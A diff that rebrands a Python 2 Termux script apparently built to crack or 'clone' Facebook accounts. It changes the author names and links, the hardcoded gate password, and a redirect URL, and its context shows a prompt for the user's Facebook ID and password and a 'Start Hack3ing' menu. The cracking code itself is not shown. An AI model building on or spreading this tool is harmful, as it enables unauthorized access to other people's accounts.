@@ -57,8 +57,8 @@ logo = """
 \033[0;39m┗┛︱┗┛ ┗━━━┛ ┗━━━━┛ ┗━━━━┛  ┗━━┛
 \033[0;39m
 \033[0;39m
-\033[0;39m\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|Mr-Hari\033[0;31m║
-\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/haris634\033[0m \033[0;31m║
+\033[0;39m\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|Mr-HUZZI\033[0;31m║
+\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/BHHZK9211\033[0m \033[0;31m║
 \033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m0308-××××-××××\033[0;31m║
 \033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
@@ -81,11 +81,11 @@ os.system("clear")
 print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
 print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : 08×××××××\x1b[1;96m  
 \033[1;93m [¤] \x1b[0;31mSTAY HOME\x1b[1;96m      [¤] \x1b[0;31mFACEBOOK : TERMUX TOOLS\x1b[1;96m  
-\033[1;93m [¤] \x1b[0;31mTOOLS BY MR\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : MR HARI\x1b[0;31m"""
+\033[1;93m [¤] \x1b[0;31mTOOLS BY MR HUZZI\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : MR HUZZI\x1b[0;31m"""
 print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"
 
-CorrectUsername = "hari"
-CorrectPassword = "hari"
+CorrectUsername = "huzzi"
+CorrectPassword = "baba"
 
 loop = 'true'
 while (loop == 'true'):
@@ -97,10 +97,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "yang bener dong"
-            os.system('xdg-open https://wa.me/6285691015635')
+            os.system('xdg-open https://www.facebook.com/aamirzk420')
     else:
         print "salah sayang!"
-        os.system('xdg-open https://wa.me/6285691015635')
+        os.system('xdg-open https://www.facebook.com/aamirzk420')
 
 def login():
 	os.system('clear')
@@ -111,7 +111,7 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;91mAPNA FACEBOOK ACCOUNT LOGIN KREIN \x1b[1;96m[☆]' )
+		print('\033[1;96m[☆] \x1b[1;91mLOGIN WITH NEW FACEBOOL ACCOUNT\x1b[1;96m[☆]' )
 		id = raw_input('\033[1;96m[+] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[+] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
@@ -194,7 +194,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update M.T"																														
+	print "\033[1;32;40m[2] \033[1;33;40m══Update H.T"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -301,7 +301,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;31;48m●💋════════════════════════◄►════════════════════════💋●"
 
-	jalan('                    \033[1;91mMR HARI start cloning Wait...')
+	jalan('                    \033[1;91mMR HUZZI start cloning Wait...')
 	print  "  \033[1;36;48m ●💋════════════════════════◄►════════════════════════💋●" 
 
 	def main(arg):
